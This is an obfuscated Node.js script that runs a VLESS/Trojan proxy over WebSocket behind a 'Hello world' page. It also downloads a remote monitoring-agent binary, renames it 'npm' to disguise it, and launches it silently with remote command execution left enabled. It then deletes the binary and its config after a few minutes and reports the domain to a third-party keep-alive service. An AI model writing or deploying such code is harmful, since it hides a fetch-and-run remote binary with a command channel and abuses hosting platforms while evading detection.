const _0x4e5191=_0x2b30;(function(_0x103760,_0x56f838){const _0x116109=_0x2b30,_0x369f21=_0x103760();while(!![]){try{const _0xc5230d=-parseInt(_0x116109(0xd5))/0x1*(-parseInt(_0x116109(0x12b))/0x2)+-parseInt(_0x116109(0x12a))/0x3+-parseInt(_0x116109(0x10b))/0x4*(parseInt(_0x116109(0xcf))/0x5)+parseInt(_0x116109(0x107))/0x6*(-parseInt(_0x116109(0x112))/0x7)+-parseInt(_0x116109(0x123))/0x8+parseInt(_0x116109(0x103))/0x9*(-parseInt(_0x116109(0xf5))/0xa)+parseInt(_0x116109(0xff))/0xb;if(_0xc5230d===_0x56f838)break;else _0x369f21['push'](_0x369f21['shift']());}catch(_0x57e29f){_0x369f21['push'](_0x369f21['shift']());}}}(_0x1b03,0xa16bc));function _0x2b30(_0x4c6faa,_0xfb14cf){_0x4c6faa=_0x4c6faa-0xb8;const _0x1b03b0=_0x1b03();let _0x2b30ac=_0x1b03b0[_0x4c6faa];return _0x2b30ac;}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x4e5191(0x124)),net=require(_0x4e5191(0xcb)),path=require(_0x4e5191(0xdd)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4e5191(0x114)]['UUID']||_0x4e5191(0xca),NEZHA_SERVER=process[_0x4e5191(0x114)][_0x4e5191(0xdc)]||'',NEZHA_PORT=process[_0x4e5191(0x114)][_0x4e5191(0xc0)]||'',NEZHA_KEY=process[_0x4e5191(0x114)][_0x4e5191(0x11c)]||'',DOMAIN=process['env'][_0x4e5191(0xd2)]||_0x4e5191(0x131),AUTO_ACCESS=process[_0x4e5191(0x114)][_0x4e5191(0xd9)]||!![],WSPATH=process[_0x4e5191(0x114)][_0x4e5191(0x116)]||UUID[_0x4e5191(0xd7)](0x0,0x8),SUB_PATH=process[_0x4e5191(0x114)][_0x4e5191(0xf1)]||'sub',NAME=process[_0x4e5191(0x114)][_0x4e5191(0xf8)]||_0x4e5191(0xc7),PORT=process[_0x4e5191(0x114)][_0x4e5191(0x135)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x458e70=_0x4e5191;try{const _0x306d32=await axios['get'](_0x458e70(0xe6)),_0xd4a398=_0x306d32[_0x458e70(0xe5)];ISP=(_0xd4a398[_0x458e70(0x106)]+'-'+_0xd4a398[_0x458e70(0xf9)])[_0x458e70(0xbc)](/ /g,'_');}catch(_0x5034c0){ISP='Unknown';}};GetISP();const httpServer=http[_0x4e5191(0xcd)]((_0x1570ef,_0x491987)=>{const _0x58ac57=_0x4e5191;if(_0x1570ef[_0x58ac57(0xef)]==='/'){const _0x8afeb9=path[_0x58ac57(0xec)](__dirname,'index.html');fs[_0x58ac57(0xd6)](_0x8afeb9,_0x58ac57(0x127),(_0x42e094,_0x5dd2a3)=>{const _0x1ecd47=_0x58ac57;if(_0x42e094){_0x491987[_0x1ecd47(0xce)](0xc8,{'Content-Type':_0x1ecd47(0xc8)}),_0x491987['end'](_0x1ecd47(0xe4));return;}_0x491987['writeHead'](0xc8,{'Content-Type':_0x1ecd47(0xc8)}),_0x491987[_0x1ecd47(0x115)](_0x5dd2a3);});return;}else{if(_0x1570ef[_0x58ac57(0xef)]==='/'+SUB_PATH){const _0x2e0c9b=_0x58ac57(0xbb)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x58ac57(0x104)+DOMAIN+_0x58ac57(0x120)+WSPATH+'#'+NAME+'-'+ISP,_0x252558=_0x58ac57(0xe8)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x58ac57(0x104)+DOMAIN+_0x58ac57(0x120)+WSPATH+'#'+NAME+'-'+ISP,_0x3262a5=_0x2e0c9b+'\x0a'+_0x252558,_0x2c31a8=Buffer[_0x58ac57(0x137)](_0x3262a5)[_0x58ac57(0x133)](_0x58ac57(0x136));_0x491987[_0x58ac57(0xce)](0xc8,{'Content-Type':_0x58ac57(0xd1)}),_0x491987['end'](_0x2c31a8+'\x0a');}else _0x491987[_0x58ac57(0xce)](0x194,{'Content-Type':_0x58ac57(0xd1)}),_0x491987[_0x58ac57(0x115)](_0x58ac57(0x11d));}}),wss=new WebSocket[(_0x4e5191(0xee))]({'server':httpServer}),uuid=UUID[_0x4e5191(0xbc)](/-/g,''),DNS_SERVERS=[_0x4e5191(0x121),_0x4e5191(0xeb)];function resolveHost(_0x3645e8){return new Promise((_0x3f3e1b,_0x486bca)=>{const _0x440dcd=_0x2b30;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x440dcd(0x125)](_0x3645e8)){_0x3f3e1b(_0x3645e8);return;}let _0x17d181=0x0;function _0x25d1d0(){const _0x18145e=_0x440dcd;if(_0x17d181>=DNS_SERVERS['length']){_0x486bca(new Error(_0x18145e(0xf2)+_0x3645e8+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x328526=DNS_SERVERS[_0x17d181];_0x17d181++;const _0x593a6e='https://dns.google/resolve?name='+encodeURIComponent(_0x3645e8)+_0x18145e(0xc2);axios[_0x18145e(0xd3)](_0x593a6e,{'timeout':0x1388,'headers':{'Accept':_0x18145e(0xf3)}})[_0x18145e(0x130)](_0x109901=>{const _0x272558=_0x18145e,_0x37aabb=_0x109901[_0x272558(0xe5)];if(_0x37aabb[_0x272558(0x11a)]===0x0&&_0x37aabb[_0x272558(0xf6)]&&_0x37aabb[_0x272558(0xf6)][_0x272558(0x119)]>0x0){const _0x27e511=_0x37aabb['Answer'][_0x272558(0x118)](_0x1ae5d2=>_0x1ae5d2[_0x272558(0xe2)]===0x1);if(_0x27e511){_0x3f3e1b(_0x27e511['data']);return;}}_0x25d1d0();})[_0x18145e(0xf4)](_0x16dda1=>{_0x25d1d0();});}_0x25d1d0();});}function _0x1b03(){const _0x418f9a=['npm\x20download\x20successfully','1212612owCbVG','1768638SheRgc','aarch64','connection','true','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','then','1234.abc.com','writeFileSync','toString','close','PORT','base64','from','config.yaml','false','npm\x20running\x20error:','readUInt8','vless://','replace','Automatic\x20Access\x20Task\x20added\x20successfully','concat','pop','NEZHA_PORT','2096','&type=A','8443','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm','Hug','text/html','sha224','69d183e7-4274-4426-e8aa-4832a9f38076','net','write','createServer','writeHead','10490aqPXoP','listen','text/plain','DOMAIN','get','includes','1pSmVwP','readFile','slice','/bin/bash','AUTO_ACCESS','arm','Server\x20is\x20running\x20on\x20port\x20','NEZHA_SERVER','path','2087','setsid\x20nohup\x20./npm\x20-s\x20','createWriteStream','send','type','arch','Hello\x20world!','data','https://speed.cloudflare.com/meta','arm64','trojan://','https://amd64.ssss.nyc.mn/v1','pipe','1.1.1.1','join','2053','Server','url','https://arm64.ssss.nyc.mn/v1','SUB_PATH','Failed\x20to\x20resolve\x20','application/dns-json','catch','10geUalP','Answer','readUInt16BE','NAME','asOrganization','unlink','error','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','update','map','21837838JsjxEw','split','log','https://amd64.ssss.nyc.mn/agent','4624686mZULxP','&fp=chrome&type=ws&host=','2083','country','432TqhRUJ','every','https://oooo.serv00.net/add-url','createHash','844LxnmqY','connect','https://arm64.ssss.nyc.mn/agent','finish','digest','npm\x20is\x20running','application/json','71141BIyyDE','substr','env','end','WSPATH','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','find','length','Status','utf-8','NEZHA_KEY','Not\x20Found\x0a','hex','reduce','&path=%2F','8.8.4.4','npm\x20is\x20already\x20running,\x20skip\x20running...','927400rIbEwg','axios','test','decode','utf8','--tls'];_0x1b03=function(){return _0x418f9a;};return _0x1b03();}function handleVlessConnection(_0x370cb4,_0x1de1c6){const _0x15e578=_0x4e5191,[_0x598354]=_0x1de1c6,_0x164a22=_0x1de1c6[_0x15e578(0xd7)](0x1,0x11);if(!_0x164a22['every']((_0x30ddff,_0x216162)=>_0x30ddff==parseInt(uuid[_0x15e578(0x113)](_0x216162*0x2,0x2),0x10)))return![];let _0x5ec433=_0x1de1c6['slice'](0x11,0x12)[_0x15e578(0xba)]()+0x13;const _0x4dfcfb=_0x1de1c6['slice'](_0x5ec433,_0x5ec433+=0x2)[_0x15e578(0xf7)](0x0),_0x258228=_0x1de1c6[_0x15e578(0xd7)](_0x5ec433,_0x5ec433+=0x1)[_0x15e578(0xba)](),_0x29af4c=_0x258228==0x1?_0x1de1c6['slice'](_0x5ec433,_0x5ec433+=0x4)[_0x15e578(0xec)]('.'):_0x258228==0x2?new TextDecoder()[_0x15e578(0x126)](_0x1de1c6['slice'](_0x5ec433+0x1,_0x5ec433+=0x1+_0x1de1c6[_0x15e578(0xd7)](_0x5ec433,_0x5ec433+0x1)[_0x15e578(0xba)]())):_0x258228==0x3?_0x1de1c6[_0x15e578(0xd7)](_0x5ec433,_0x5ec433+=0x10)[_0x15e578(0x11f)]((_0x4988c3,_0x3d5a00,_0x165265,_0x20a74c)=>_0x165265%0x2?_0x4988c3[_0x15e578(0xbe)](_0x20a74c[_0x15e578(0xd7)](_0x165265-0x1,_0x165265+0x1)):_0x4988c3,[])[_0x15e578(0xfe)](_0x5c57a1=>_0x5c57a1[_0x15e578(0xf7)](0x0)['toString'](0x10))[_0x15e578(0xec)](':'):'';_0x370cb4[_0x15e578(0xe1)](new Uint8Array([_0x598354,0x0]));const _0x3a7e81=createWebSocketStream(_0x370cb4);return resolveHost(_0x29af4c)[_0x15e578(0x130)](_0x1f311e=>{const _0x329a91=_0x15e578;net[_0x329a91(0x10c)]({'host':_0x1f311e,'port':_0x4dfcfb},function(){const _0x3614bf=_0x329a91;this['write'](_0x1de1c6[_0x3614bf(0xd7)](_0x5ec433)),_0x3a7e81['on'](_0x3614bf(0xfb),()=>{})[_0x3614bf(0xea)](this)['on']('error',()=>{})[_0x3614bf(0xea)](_0x3a7e81);})['on'](_0x329a91(0xfb),()=>{});})[_0x15e578(0xf4)](_0x5e0fe0=>{const _0x22de59=_0x15e578;net[_0x22de59(0x10c)]({'host':_0x29af4c,'port':_0x4dfcfb},function(){const _0x4dfc91=_0x22de59;this[_0x4dfc91(0xcc)](_0x1de1c6[_0x4dfc91(0xd7)](_0x5ec433)),_0x3a7e81['on'](_0x4dfc91(0xfb),()=>{})[_0x4dfc91(0xea)](this)['on']('error',()=>{})[_0x4dfc91(0xea)](_0x3a7e81);})['on'](_0x22de59(0xfb),()=>{});}),!![];}function handleTrojanConnection(_0x44b73a,_0x480a58){const _0x50bd1b=_0x4e5191;try{if(_0x480a58['length']<0x3a)return![];const _0x134476=_0x480a58[_0x50bd1b(0xd7)](0x0,0x38)[_0x50bd1b(0x133)](),_0x13e6be=[UUID];let _0x3e0c79=null;for(const _0xf742db of _0x13e6be){const _0x26897b=crypto[_0x50bd1b(0x10a)](_0x50bd1b(0xc9))[_0x50bd1b(0xfd)](_0xf742db)[_0x50bd1b(0x10f)](_0x50bd1b(0x11e));if(_0x26897b===_0x134476){_0x3e0c79=_0xf742db;break;}}if(!_0x3e0c79)return![];let _0x2a2d29=0x38;_0x480a58[_0x2a2d29]===0xd&&_0x480a58[_0x2a2d29+0x1]===0xa&&(_0x2a2d29+=0x2);const _0x274383=_0x480a58[_0x2a2d29];if(_0x274383!==0x1)return![];_0x2a2d29+=0x1;const _0x2d3416=_0x480a58[_0x2a2d29];_0x2a2d29+=0x1;let _0x433a73,_0x2c16d0;if(_0x2d3416===0x1)_0x433a73=_0x480a58[_0x50bd1b(0xd7)](_0x2a2d29,_0x2a2d29+0x4)['join']('.'),_0x2a2d29+=0x4;else{if(_0x2d3416===0x3){const _0x5f1355=_0x480a58[_0x2a2d29];_0x2a2d29+=0x1,_0x433a73=_0x480a58['slice'](_0x2a2d29,_0x2a2d29+_0x5f1355)['toString'](),_0x2a2d29+=_0x5f1355;}else{if(_0x2d3416===0x4)_0x433a73=_0x480a58[_0x50bd1b(0xd7)](_0x2a2d29,_0x2a2d29+0x10)[_0x50bd1b(0x11f)]((_0x665638,_0x31c188,_0x10255a,_0x58a0a3)=>_0x10255a%0x2?_0x665638[_0x50bd1b(0xbe)](_0x58a0a3[_0x50bd1b(0xd7)](_0x10255a-0x1,_0x10255a+0x1)):_0x665638,[])['map'](_0x2e3ad0=>_0x2e3ad0['readUInt16BE'](0x0)[_0x50bd1b(0x133)](0x10))[_0x50bd1b(0xec)](':'),_0x2a2d29+=0x10;else return![];}}_0x2c16d0=_0x480a58[_0x50bd1b(0xf7)](_0x2a2d29),_0x2a2d29+=0x2;_0x2a2d29<_0x480a58[_0x50bd1b(0x119)]&&_0x480a58[_0x2a2d29]===0xd&&_0x480a58[_0x2a2d29+0x1]===0xa&&(_0x2a2d29+=0x2);const _0x536208=createWebSocketStream(_0x44b73a);return resolveHost(_0x433a73)['then'](_0x4bcf73=>{const _0x4e1088=_0x50bd1b;net[_0x4e1088(0x10c)]({'host':_0x4bcf73,'port':_0x2c16d0},function(){const _0x54c0b1=_0x4e1088;_0x2a2d29<_0x480a58['length']&&this['write'](_0x480a58['slice'](_0x2a2d29)),_0x536208['on'](_0x54c0b1(0xfb),()=>{})[_0x54c0b1(0xea)](this)['on'](_0x54c0b1(0xfb),()=>{})[_0x54c0b1(0xea)](_0x536208);})['on'](_0x4e1088(0xfb),()=>{});})[_0x50bd1b(0xf4)](_0x310238=>{const _0x3b830a=_0x50bd1b;net[_0x3b830a(0x10c)]({'host':_0x433a73,'port':_0x2c16d0},function(){const _0x271543=_0x3b830a;_0x2a2d29<_0x480a58[_0x271543(0x119)]&&this[_0x271543(0xcc)](_0x480a58[_0x271543(0xd7)](_0x2a2d29)),_0x536208['on']('error',()=>{})[_0x271543(0xea)](this)['on'](_0x271543(0xfb),()=>{})[_0x271543(0xea)](_0x536208);})['on'](_0x3b830a(0xfb),()=>{});}),!![];}catch(_0x526cdc){return![];}}wss['on'](_0x4e5191(0x12d),(_0x5f47fc,_0x508cf6)=>{const _0x161c57=_0x4e5191,_0x26518e=_0x508cf6[_0x161c57(0xef)]||'';_0x5f47fc['once']('message',_0x2d7509=>{const _0x310a56=_0x161c57;if(_0x2d7509[_0x310a56(0x119)]>0x11&&_0x2d7509[0x0]===0x0){const _0x28ea23=_0x2d7509[_0x310a56(0xd7)](0x1,0x11),_0x40940a=_0x28ea23[_0x310a56(0x108)]((_0x569020,_0x58b168)=>_0x569020==parseInt(uuid[_0x310a56(0x113)](_0x58b168*0x2,0x2),0x10));if(_0x40940a){!handleVlessConnection(_0x5f47fc,_0x2d7509)&&_0x5f47fc['close']();return;}}!handleTrojanConnection(_0x5f47fc,_0x2d7509)&&_0x5f47fc[_0x310a56(0x134)]();})['on'](_0x161c57(0xfb),()=>{});});const getDownloadUrl=()=>{const _0x2c908e=_0x4e5191,_0x23e1a6=os[_0x2c908e(0xe3)]();return _0x23e1a6===_0x2c908e(0xda)||_0x23e1a6===_0x2c908e(0xe7)||_0x23e1a6===_0x2c908e(0x12c)?!NEZHA_PORT?_0x2c908e(0xf0):_0x2c908e(0x10d):!NEZHA_PORT?_0x2c908e(0xe9):_0x2c908e(0x102);},downloadFile=async()=>{const _0x3b3efa=_0x4e5191;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5c5e02=getDownloadUrl(),_0x2a9d68=await axios({'method':_0x3b3efa(0xd3),'url':_0x5c5e02,'responseType':'stream'}),_0x2f64cc=fs[_0x3b3efa(0xe0)](_0x3b3efa(0xc6));return _0x2a9d68[_0x3b3efa(0xe5)][_0x3b3efa(0xea)](_0x2f64cc),new Promise((_0x2d4404,_0x5ad891)=>{const _0x2c79f1=_0x3b3efa;_0x2f64cc['on'](_0x2c79f1(0x10e),()=>{const _0x206fe8=_0x2c79f1;console['log'](_0x206fe8(0x129)),exec('chmod\x20+x\x20npm',_0x3cf4bf=>{if(_0x3cf4bf)_0x5ad891(_0x3cf4bf);_0x2d4404();});}),_0x2f64cc['on']('error',_0x5ad891);});}catch(_0x2956da){throw _0x2956da;}},runnz=async()=>{const _0x25347d=_0x4e5191;try{const _0xbb26e0=execSync(_0x25347d(0xc4),{'encoding':_0x25347d(0x11b)});if(_0xbb26e0['trim']()!==''){console[_0x25347d(0x101)](_0x25347d(0x122));return;}}catch(_0x480149){}await downloadFile();let _0x1efc64='',_0x40597e=['443',_0x25347d(0xc3),_0x25347d(0xc1),_0x25347d(0xde),_0x25347d(0x105),_0x25347d(0xed)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2877c7=_0x40597e[_0x25347d(0xd4)](NEZHA_PORT)?_0x25347d(0x128):'';_0x1efc64=_0x25347d(0xdf)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2877c7+_0x25347d(0x12f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x39467e=NEZHA_SERVER[_0x25347d(0xd4)](':')?NEZHA_SERVER[_0x25347d(0x100)](':')[_0x25347d(0xbf)]():'',_0x82a772=_0x40597e[_0x25347d(0xd4)](_0x39467e)?_0x25347d(0x12e):_0x25347d(0xb8),_0x2c4bd9='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x25347d(0xfc)+_0x82a772+_0x25347d(0xc5)+UUID;fs[_0x25347d(0x132)](_0x25347d(0x138),_0x2c4bd9);}_0x1efc64='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x25347d(0x117));return;}}try{exec(_0x1efc64,{'shell':_0x25347d(0xd8)},_0x53138b=>{const _0x555891=_0x25347d;if(_0x53138b)console[_0x555891(0xfb)](_0x555891(0xb9),_0x53138b);else console['log'](_0x555891(0x110));});}catch(_0x190235){console[_0x25347d(0xfb)]('error:\x20'+_0x190235);}};async function addAccessTask(){const _0x2896d2=_0x4e5191;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x116c60='https://'+DOMAIN;try{const _0x4665ef=await axios['post'](_0x2896d2(0x109),{'url':_0x116c60},{'headers':{'Content-Type':_0x2896d2(0x111)}});console[_0x2896d2(0x101)](_0x2896d2(0xbd));}catch(_0x54766e){}}const delFiles=()=>{const _0x3ccf63=_0x4e5191;fs[_0x3ccf63(0xfa)](_0x3ccf63(0xc6),()=>{}),fs[_0x3ccf63(0xfa)](_0x3ccf63(0x138),()=>{});};httpServer[_0x4e5191(0xd0)](PORT,()=>{const _0x57f69d=_0x4e5191;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x57f69d(0x101)](_0x57f69d(0xdb)+PORT);});
